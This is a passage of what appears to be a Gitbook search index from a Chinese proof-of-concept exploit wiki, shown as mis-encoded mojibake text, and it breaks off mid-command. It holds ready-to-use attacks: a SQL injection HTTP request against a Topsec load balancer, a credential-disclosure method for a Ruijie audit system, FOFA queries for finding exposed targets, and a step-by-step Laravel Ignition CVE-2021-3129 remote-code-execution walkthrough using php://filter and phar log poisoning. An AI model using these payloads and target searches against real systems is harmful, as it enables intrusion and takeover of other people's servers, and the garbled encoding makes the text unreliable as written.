Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/å¤©èä¿¡/å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´.html","title":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´","keywords":"","body":"å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB Sqlæ³¨å…¥æ¼æ´ æ¼æ´æè¿° å¤©èä¿¡è´Ÿè½½å‡è¡¡ TopAPP-LBäº§å“æ—§ç‰ˆæœ¬åœ¨ç®¡ç†é¢å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œå…·ä½“ä¸ºåœ¨å¯ä»¥è®¿é—®ç®¡ç†æœåŠ¡æƒ…å†µ ä¸‹ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„è¯·æ±‚ï¼Œåˆ©ç”¨ç³»ç»Ÿæ£€æŸ¥è¾“å…¥æ¡ä»¶ä¸ä¸¥æ ¼çš„ç¼ºé™·ï¼Œè¿›ä¸€æ­¥å¯è·å–éƒ¨åˆ†ç³»ç»Ÿæœ¬åœ°ä¿¡æ¯ å½±å“ç‰ˆæœ¬ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB FOFA [!NOTE] app=\"å¤©èä¿¡-TopApp-LB-è´Ÿè½½å‡è¡¡ç³»ç»Ÿ\" æ¼æ´å¤ç° åˆ©ç”¨ å¤©èä¿¡è´Ÿè½½å‡è¡¡TopApp-LB ä»»æ„ç™»é™† ä½¿ç”¨åå° æäº¤ä»¥ä¸‹æ•°æ®åŒ… POST /acc/clsf/report/datasource.php HTTP/1.1 Host: Connection: close Accept: text/javascript, text/html, application/xml, text/xml, */* X-Prototype-Version: 1.6.0.3 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=ijqtopbcbmu8d70o5t3kmvgt57 Content-Type: application/x-www-form-urlencoded Content-Length: 201 t=l&e=0&s=t&l=1&vid=2147483647 or 1=1&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@ã€‚ã€‚ å­˜åœ¨SQLç›²æ³¨ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é”æ·/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é”æ·/","title":"é”æ·","keywords":"","body":"WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é”æ·/é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ².html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/é”æ·/é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ².html","title":"é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²","keywords":"","body":"é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ² æ¼æ´æè¿° é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿå­˜åœ¨è´¦å·å¯†ç ä¿¡æ¯æ³„éœ²,å¯ä»¥é—´æ¥è·å–ç”¨æˆ·è´¦å·å¯†ç ä¿¡æ¯ç™»å½•åå° å½±å“ç‰ˆæœ¬ [!NOTE] é”æ·RG-UACç»Ÿä¸€ä¸Šç½‘è¡Œä¸ºç®¡ç†å®¡è®¡ç³»ç»Ÿ FOFA [!NOTE] title=\"RG-UACç™»å½•é¡µé¢\" æ¼æ´å¤ç° æ¥åˆ°ç™»å½•é¡µé¢ æŒ‰F12æŸ¥çœ‹æºç ,å¯ä»¥å‘ç°è´¦å·å’Œå¯†ç çš„md5å½¢å¼ è§£å¯†md5å¾—åˆ°å¯†ç åå³å¯ç™»å½•ç³»ç»Ÿ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/","title":"å¼€å‘æ¡†æ¶æ¼æ´","keywords":"","body":"å¼€å‘æ¡†æ¶æ¼æ´ğŸ‡ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/","title":"Laravel","keywords":"","body":"Laravel Laravel WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129.html":{"url":"PeiQi_Wiki/å¼€å‘æ¡†æ¶æ¼æ´/Laravel/Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129.html","title":"Laravel å°äº 8.4.2 Debugæ¨¡å¼ _ignition è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-3129","keywords":"","body":"Laravel æ¼æ´æè¿° Laravel æ˜¯ä¸€ä¸ªå…è´¹çš„å¼€æº PHP Web æ¡†æ¶ï¼Œæ—¨åœ¨å®ç°çš„Webè½¯ä»¶çš„MVCæ¶æ„ã€‚2021å¹´1æœˆ13æ—¥ï¼Œé˜¿é‡Œäº‘åº”æ€¥å“åº”ä¸­å¿ƒç›‘æ§åˆ°å›½å¤–æŸå®‰å…¨ç ”ç©¶å›¢é˜ŸæŠ«éœ²äº† Laravel æ¼æ´å½±å“ [!NOTE] Laravel æ¡†æ¶ facade ignition ç»„ä»¶ ç¯å¢ƒæ­å»º git clone https://github.com/laravel/laravel.git cd laravel git checkout e849812 composer install composer require facade/ignition==2.5.1 cp .env.example .env php artisan serve å°† laravel/config/app.php ä¸­çš„ debug è®¾ç½®ä¸º true è®¿é—® http://local:8000 ç‚¹å‡»ç”Ÿæˆå¯†é’¥å‡ºç°å¦‚ä¸‹å›¾å³æˆåŠŸåˆ›å»ºå¯†é’¥ åˆ·æ–°åæ­£å¸¸è®¿é—® æ¼æ´å¤ç° æŒ‰ç…§æ¼æ´å…¬å¼€æ–‡ç« éœ€è¦å…ˆæœ‰ä¸€ä¸ªæœªçŸ¥å˜é‡çš„é”™è¯¯ï¼Œæ¥ç‚¹å‡» Make variable optional [!NOTE] æŒ‰ç…§å®˜æ–¹æ‰‹å†Œåˆ›å»ºè·¯ç”±å’ŒViewæ¨¡æ¿ é€šè¿‡ç‚¹å‡»â€œMake variableOptionalâ€æŒ‰é’®ï¼Œæ¨¡æ¿å˜é‡åˆ™ä¼šè¢«ä¿®æ”¹ã€‚å¦‚æœæ£€æŸ¥HTTPæ—¥å¿—ï¼Œæˆ‘ä»¬å°±ä¼šçœ‹åˆ°è¢«è°ƒç”¨çš„ç«¯ç‚¹ é€šè¿‡è¿™äº›solutionsï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡ç‚¹å‡»æŒ‰é’®çš„æ–¹å¼ï¼Œå¿«é€Ÿä¿®å¤ä¸€äº›é”™è¯¯ã€‚æœ¬æ¬¡æ¼æ´å°±æ˜¯å…¶ä¸­çš„vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.phpè¿‡æ»¤ä¸ä¸¥è°¨å¯¼è‡´çš„ã€‚é¦–å…ˆæˆ‘ä»¬åˆ°æ‰§è¡Œsolutionçš„æ§åˆ¶å™¨å½“ä¸­å»ï¼Œçœ‹çœ‹æ˜¯å¦‚ä½•è°ƒç”¨åˆ°solutionçš„ getRunnableSolution(); $solution->run($request->get('parameters', [])); return response(''); } } æ¥ç€è°ƒç”¨solutionå¯¹è±¡ä¸­çš„run()æ–¹æ³•ï¼Œå¹¶å°†å¯æ§çš„parameterså‚æ•°ä¼ è¿‡å»ã€‚é€šè¿‡è¿™ä¸ªç‚¹æˆ‘ä»¬å¯ä»¥è°ƒç”¨åˆ°MakeViewVariableOptionalSolution::run() makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } } å¯ä»¥çœ‹åˆ°è¿™é‡Œä¸»è¦åŠŸèƒ½ç‚¹æ˜¯ï¼šè¯»å–ä¸€ä¸ªç»™å®šçš„è·¯å¾„ï¼Œå¹¶æ›¿æ¢$variableNameä¸º$variableName ?? ''ï¼Œä¹‹åå†™å›æ–‡ä»¶ä¸­ã€‚ç”±äºè¿™é‡Œè°ƒç”¨äº†file_get_contents()ï¼Œä¸”å…¶ä¸­çš„å‚æ•°å¯æ§ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡phar://åè®®å»è§¦å‘pharååºåˆ—åŒ–ã€‚å¦‚æœåæœŸåˆ©ç”¨æ¡†æ¶è¿›è¡Œå¼€å‘çš„äººå‘˜ï¼Œå†™å‡ºäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ¶æ„pharæ–‡ä»¶ï¼Œåˆ©ç”¨ä¸Šè¿°çš„file_get_contents()å»è§¦å‘pharååºåˆ—åŒ–ï¼Œè¾¾åˆ°rceçš„æ•ˆæœã€‚ é™¤äº†è§£å†³æ–¹æ¡ˆçš„ç±»åä¹‹å¤–ï¼Œè¿˜å‘é€äº†ä¸€ä¸ªæ–‡ä»¶è·¯å¾„å’Œä¸€ä¸ªæˆ‘ä»¬è¦æ›¿æ¢çš„å˜é‡åã€‚è¿™çœ‹èµ·æ¥éå¸¸è®©äººæ„Ÿå…´è¶£ã€‚ è®©æˆ‘ä»¬å…ˆæ£€æŸ¥ä¸€ä¸‹ç±»åçš„åˆ©ç”¨æ–¹æ³•ï¼šæˆ‘ä»¬å¯ä»¥å®ä¾‹åŒ–ä»»æ„çš„ç±»å—ï¼Ÿ class SolutionProviderRepository implements SolutionProviderRepositoryContract { ... public function getSolutionForClass(string $solutionClass): ?Solution { if (! class_exists($solutionClass)) { return null; } if (! in_array(Solution::class, class_implements($solutionClass))) { return null; } return app($solutionClass); } } ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼šIgnitionæ€»æ˜¯ç”¨æˆ‘ä»¬æŒ‡å‘çš„ç±»æ¥å®ç°RunnableSolution é‚£ä¹ˆï¼Œè®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹è¿™ä¸ªç±»ã€‚å®é™…ä¸Šï¼Œè´Ÿè´£è¯¥æ“ä½œçš„ä»£ç ä½./vendor/facade/ignition/sr/solutions/MakeViewVariableOptionalSolution.phpæ–‡ä»¶ä¸­ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ”¹ä»»æ„æ–‡ä»¶çš„å†…å®¹ä¹ˆï¼Ÿ class MakeViewVariableOptionalSolution implements RunnableSolution { ... public function run(array $parameters = []) { $output = $this->makeOptional($parameters); if ($output !== false) { file_put_contents($parameters['viewFile'], $output); } } public function makeOptional(array $parameters = []) { $originalContents = file_get_contents($parameters['viewFile']); // [1] $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName'].\" ?? ''\", $originalContents); $originalTokens = token_get_all(Blade::compileString($originalContents)); // [2] $newTokens = token_get_all(Blade::compileString($newContents)); $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']); if ($expectedTokens !== $newTokens) { // [3] return false; } return $newContents; } protected function generateExpectedTokens(array $originalTokens, string $variableName): array { $expectedTokens = []; foreach ($originalTokens as $token) { $expectedTokens[] = $token; if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) { $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_COALESCE, '??', $token[2]]; $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]]; $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, \"''\", $token[2]]; } } return $expectedTokens; } ... } è¿™æ®µä»£ç æ¯”æˆ‘ä»¬é¢„æƒ³çš„è¦å¤æ‚ä¸€äº›ï¼šå®ƒä¼šåœ¨è¯»å–ç»™å®šçš„æ–‡ä»¶è·¯å¾„[1]åï¼Œå°†$variableNameæ›¿æ¢ä¸º$variableName ?? ''ï¼Œåˆå§‹æ–‡ä»¶å’Œæ–°æ–‡ä»¶éƒ½å°†è¢«æ ‡è®°åŒ–[2]ã€‚å¦‚æœæˆ‘ä»¬çš„ä»£ç ç»“æ„æ²¡æœ‰å‘ç”Ÿè¶…å‡ºé¢„æœŸçš„å˜åŒ–ï¼Œæ–‡ä»¶å°†è¢«æ›¿æ¢ä¸ºæ–°çš„å†…å®¹ã€‚å¦åˆ™ï¼ŒmakeOptionalå°†è¿”å›false[3]ï¼Œæ–°æ–‡ä»¶å°†ä¸ä¼šè¢«å†™å…¥ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ— æ³•ä½¿ç”¨variableNameåšå¤ªå¤šäº‹æƒ…ã€‚ å‰©ä¸‹çš„å”¯ä¸€è¾“å…¥å˜é‡å°±æ˜¯viewFileã€‚å¦‚æœæˆ‘ä»¬å¯¹variableNameå’Œå®ƒçš„æ‰€æœ‰ç”¨æ³•è¿›è¡ŒæŠ½è±¡ï¼Œæˆ‘ä»¬æœ€ç»ˆä¼šå¾—åˆ°ä¸‹é¢çš„ä»£ç ç‰‡æ®µï¼š $contents =file_get_contents($parameters['viewFile']); file_put_contents($parameters['viewFile'], $contents); åˆ°ç›®å‰ä¸ºæ­¢ï¼Œå¤§å®¶å¯èƒ½éƒ½å¬è¯´è¿‡Orange Tsaiæ¼”ç¤ºçš„ä¸Šä¼ è¿›åº¦æŠ€æœ¯ã€‚è¯¥æŠ€æœ¯åˆ©ç”¨php://filteråœ¨è¿”å›æ–‡ä»¶ä¹‹å‰ä¿®æ”¹å…¶å†…å®¹ã€‚å€ŸåŠ©äºè¯¥æŠ€æœ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡æ¼æ´åˆ©ç”¨åŸè¯­æ¥è½¬æ¢æ–‡ä»¶çš„å†…å®¹ $ echo test | base64 | base64 > /path/to/file.txt $ cat /path/to/file.txt ZEdWemRBbz0K $f = 'php://filter/convert.base64-decode/resource=/path/to/file.txt'; # Reads /path/to/file.txt, base64-decodes it, returns the result $contents = file_get_contents($f); # Base64-decodes $contents, then writes the result to /path/to/file.txt file_put_contents($f, $contents); $ cat /path/to/file.txt test æˆ‘ä»¬å·²ç»æ”¹å˜äº†æ–‡ä»¶çš„å†…å®¹ï¼é—æ†¾çš„æ˜¯ï¼Œè¿™å°†ä¼šåº”ç”¨ä¸¤æ¬¡è½¬æ¢ã€‚é˜…è¯»æ–‡æ¡£åï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†åªè¿›è¡Œä¸€æ¬¡è½¬æ¢çš„æ–¹æ³•ï¼š # To base64-decode once, use: $f = 'php://filter/read=convert.base64-decode/resource=/path/to/file.txt'; # OR $f = 'php://filter/write=convert.base64-decode/resource=/path/to/file.txt'; åå­—ç¬¦ç”šè‡³éƒ½ä¼šè¢«å¿½ç•¥ï¼š $ echo ':;.!!!!!ZEdWemRBbz0K:;.!!!!!' > /path/to/file.txt $f = 'php://filter/read=convert.base64-decode|convert.base64-decode/resource=/path/to/file.txt'; $contents = file_get_contents($f); file_put_contents($f, $contents); $ cat /path/to/file.txt test é»˜è®¤æƒ…å†µä¸‹ï¼ŒLaravelçš„æ—¥å¿—æ–‡ä»¶ï¼ˆå­˜æ”¾PHPé”™è¯¯å’Œå †æ ˆè·Ÿè¸ªï¼‰æ˜¯å­˜å‚¨åœ¨storage/log/laravel.logä¸­çš„ã€‚ä¸‹é¢ï¼Œè®©æˆ‘ä»¬é€šè¿‡å°è¯•åŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ¥ç”Ÿæˆä¸€ä¸ªé”™è¯¯, å³SOME_TEXT_OF_OUR_CHOICEï¼š [2021-01-11 12:39:44] local.ERROR: file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory {\"exception\":\"[object] (ErrorException(code: 0): file_get_contents(SOME_TEXT_OF_OUR_CHOICE): failed to open stream: No such file or directory at /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php:75) [stacktrace] #0 [internal function]: Illuminate\\\\Foundation\\\\Bootstrap\\\\HandleExceptions->handleError() #1 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(75): file_get_contents() #2 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php(67): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->makeOptional() #3 /work/pentest/laravel/laravel/vendor/facade/ignition/src/Http/Controllers/ExecuteSolutionController.php(19): Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution->run() #4 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Routing/ControllerDispatcher.php(48): Facade\\\\Ignition\\\\Http\\\\Controllers\\\\ExecuteSolutionController->__invoke() [...] #32 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Pipeline/Pipeline.php(103): Illuminate\\\\Pipeline\\\\Pipeline->Illuminate\\\\Pipeline\\\\{closure}() #33 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(141): Illuminate\\\\Pipeline\\\\Pipeline->then() #34 /work/pentest/laravel/laravel/vendor/laravel/framework/src/Illuminate/Foundation/Http/Kernel.php(110): Illuminate\\\\Foundation\\\\Http\\\\Kernel->sendRequestThroughRouter() #35 /work/pentest/laravel/laravel/public/index.php(52): Illuminate\\\\Foundation\\\\Http\\\\Kernel->handle() #36 /work/pentest/laravel/laravel/server.php(21): require_once('/work/pentest/l...') #37 {main} \"} æˆ‘ä»¬å¯ä»¥å‘æ–‡ä»¶ä¸­æ³¨å…¥ï¼ˆå‡ ä¹ï¼‰ä»»æ„çš„å†…å®¹äº†ã€‚ç†è®ºä¸Šè®²ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Orangeå‘æ˜çš„æŠ€æœ¯å°†æ—¥å¿—æ–‡ä»¶è½¬æ¢ä¸ºæœ‰æ•ˆçš„PHARæ–‡ä»¶ï¼Œç„¶åï¼Œä½¿ç”¨phar://åŒ…è£…å™¨æ¥è¿è¡Œåºåˆ—åŒ–çš„ä»£ç ã€‚é—æ†¾çš„æ˜¯ï¼Œè¿™å®é™…ä¸Šæ˜¯è¡Œä¸é€šçš„ï¼Œå¹¶ä¸”åŸå› æœ‰å¾ˆå¤šã€‚ æˆ‘ä»¬åœ¨å‰é¢è¯´è¿‡ï¼Œå½“å¯¹ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œba se64-decodingå¤„ç†æ—¶ï¼ŒPHPä¼šå¿½ç•¥ä»»ä½•åå­—ç¬¦ã€‚è¿™é€šå¸¸æ˜¯æ­£ç¡®çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªå­—ç¬¦é™¤å¤–ï¼Œå³=ã€‚å¦‚æœä½ ä½¿ç”¨ba se64-decodeè¿‡æ»¤ä¸€ä¸ªä¸­é—´å«æœ‰å­—ç¬¦=çš„å­—ç¬¦ä¸²ï¼ŒPHPå°†äº§ç”Ÿä¸€ä¸ªé”™è¯¯ï¼Œå¹¶ä¸”ä¸ä¼šè¿”å›ä»»ä½•å†…å®¹ã€‚ å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶æ•´ä¸ªæ–‡ä»¶ï¼Œé‚£å°±å¥½äº†ã€‚ç„¶è€Œï¼Œæˆ‘ä»¬æ³¨å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­çš„æ–‡æœ¬åªæ˜¯å…¶ä¸­å¾ˆå°çš„ä¸€éƒ¨åˆ†ã€‚å®ƒä¸ä»…æœ‰ä¸€ä¸ªä¸ç®—å¾ˆå¤§çš„å‰ç¼€ï¼ˆæ—¥æœŸï¼‰ï¼Œè¿˜æœ‰ä¸€ä¸ªè‡ƒè‚¿çš„åç¼€ï¼ˆå †æ ˆè·Ÿè¸ªï¼‰ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬æ³¨å…¥çš„æ–‡æœ¬è¿˜å‡ºç°äº†ä¸¤æ¬¡ï¼ ä¸‹é¢æ˜¯å¦ä¸€ä»¶å¯æ€•çš„äº‹æƒ…ï¼š php > var_dump(base64_decode(base64_decode('[2022-04-3023:59:11]'))); string(0) \"\" php >var_dump(base64_decode(base64_decode('[2022-04-12 23:59:11]'))); string(1) \"2\" æ ¹æ®æ—¥æœŸçš„ä¸åŒï¼Œå¯¹å‰ç¼€è¿›è¡Œä¸¤æ¬¡è§£ç æ—¶ï¼Œä¼šå¾—åˆ°ä¸åŒå¤§å°çš„ç»“æœã€‚å½“æˆ‘ä»¬å¯¹å®ƒè¿›è¡Œç¬¬ä¸‰æ¬¡è§£ç æ—¶ï¼Œåœ¨ç¬¬äºŒç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬çš„payloadå°†ä»¥2ä½œä¸ºå‰ç¼€ï¼Œä»è€Œéœ€è¦æ”¹å˜base64æ¶ˆæ¯çš„å¯¹é½æ–¹å¼ã€‚ ä¸ºäº†ä½¿å…¶æ­£å¸¸è¿è¡Œï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæ¯ä¸ªç›®æ ‡å»ºç«‹ä¸€ä¸ªæ–°çš„payloadï¼Œå› ä¸ºå †æ ˆè·Ÿè¸ªä¸­åŒ…å«ç»å¯¹æ–‡ä»¶åï¼›å¹¶ä¸”ï¼Œæ¯ç§’éƒ½éœ€è¦å»ºç«‹ä¸€ä¸ªæ–°çš„payloadï¼Œå› ä¸ºå‰ç¼€ä¸­åŒ…å«æ—¶é—´ã€‚å¹¶ä¸”ï¼Œåªè¦æœ‰ä¸€ä¸ªå­—ç¬¦=éœ€è¦è¿›è¡Œbase64-decodeå¤„ç†ï¼Œä»ç„¶ä¼šé¢ä¸´å¤±è´¥ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å›åˆ°PHPæ–‡æ¡£ä¸­å¯»æ‰¾å…¶ä»–ç±»å‹çš„è¿‡æ»¤å™¨ã€‚ [previous log entries] [prefix]PAYLOAD[midfix]PAYLOAD[suffix] é—æ†¾çš„æ˜¯ï¼Œæˆ‘ä»¬å·²ç»äº†è§£åˆ°ï¼Œå¦‚æœæ»¥ç”¨base64-decodeçš„è¯ï¼Œå¯èƒ½ä¼šåœ¨æŸä¸ªæ—¶å€™å¤±è´¥ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼šå¦‚æœæˆ‘ä»¬æ»¥ç”¨å®ƒï¼Œå°†å‘ç”Ÿè§£ç é”™è¯¯ï¼Œæ—¥å¿—æ–‡ä»¶å°†è¢«æ¸…é™¤ï¼è¿™æ ·ï¼Œæˆ‘ä»¬è§¦å‘çš„ä¸‹ä¸€ä¸ªé”™è¯¯å°†å•ç‹¬å­˜åœ¨äºæ—¥å¿—æ–‡ä»¶ä¸­ï¼š [prefix]PAYLOAD[midfix]PAYLOAD[suffix] ç°åœ¨ï¼Œæˆ‘ä»¬åˆå›åˆ°äº†æœ€åˆçš„é—®é¢˜ä¸Šï¼šä¿ç•™ä¸€ä¸ªpayloadå¹¶åˆ é™¤å…¶ä½™çš„ã€‚å¹¸è¿çš„æ˜¯ï¼Œphp://filterå¹¶ä¸é™äºbase64æ“ä½œã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥è½¬æ¢å­—ç¬¦é›†ï¼Œä¸‹é¢æ˜¯ä»UTF-16åˆ°UTF-8çš„è½¬æ¢ï¼š echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); å›æµ¯â¥ç‰°æ™¥ç¡©å´ PAYLOADæµ›æ‘©æ¥¦åµ¸PAYLOADå›æµ¯â¥ç•³æ™¦ç¡©å´  æˆ‘ä»¬çš„payloadè¿˜åœ¨é‚£é‡Œï¼Œå®‰å…¨æ— æ™ï¼Œåªæ˜¯å‰ç¼€å’Œåç¼€å˜æˆäº†éASCIIå­—ç¬¦ã€‚ç„¶è€Œï¼Œåœ¨æ—¥å¿—æ¡ç›®ä¸­ï¼Œæˆ‘ä»¬çš„payloadå‡ºç°äº†ä¸¤æ¬¡ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡ã€‚æˆ‘ä»¬éœ€è¦å»æ‰ç¬¬äºŒä¸ªã€‚ ç”±äºæ¯ä¸ªUTF-16å­—ç¬¦å ç”¨ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨PAYLOADçš„ç¬¬äºŒä¸ªå®ä¾‹çš„æœ«å°¾å¢åŠ ä¸€ä¸ªå­—èŠ‚ï¼Œæ¥ä½¿å…¶æ— æ³•å¯¹é½ï¼š echo -ne '[Some prefix ]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[midfix]P\\0A\\0Y\\0L\\0O\\0A\\0D\\0X[Some suffix ]' > /tmp/test.txt php > echo file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8/resource=/tmp/test.txt'); å›æµ¯â¥ç‰°æ™¥ç¡©å´ PAYLOADå­˜æ¥­æ™¤ç¡©åä„€å¤€ä°€ä¼€ä„€ä€å €å›æµ¯â¥ç•³æ™¦ç¡©å´  è¿™æ ·åšçš„å¥½å¤„æ˜¯ï¼Œå‰ç¼€çš„å¯¹é½æ–¹å¼ä¸å†é‡è¦ï¼šå¦‚æœå‰ç¼€å¤§å°ç›¸ç­‰ï¼Œç¬¬ä¸€ä¸ªpayloadå°†è¢«æ­£ç¡®è§£ç ï¼›å¦åˆ™çš„è¯ï¼Œç¬¬äºŒä¸ªpayloadå°±ä¼šè¢«æ­£ç¡®è§£ç ã€‚ å¦‚æœå°†ä¸Šé¢çš„å‘ç°ä¸å‰é¢çš„base64-decodingç»“åˆèµ·æ¥ï¼Œå°±èƒ½å¤Ÿå¯¹æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•ä¸œè¥¿è¿›è¡Œç¼–ç ï¼š $ echo -n TEST! | base64 | sed -E 's/./\\0\\\\0/g' V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0 $ echo -ne '[Some prefix ]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[midfix]V\\0E\\0V\\0T\\0V\\0C\\0E\\0=\\0X[Some suffix ]' > /tmp/test.txt php > echo 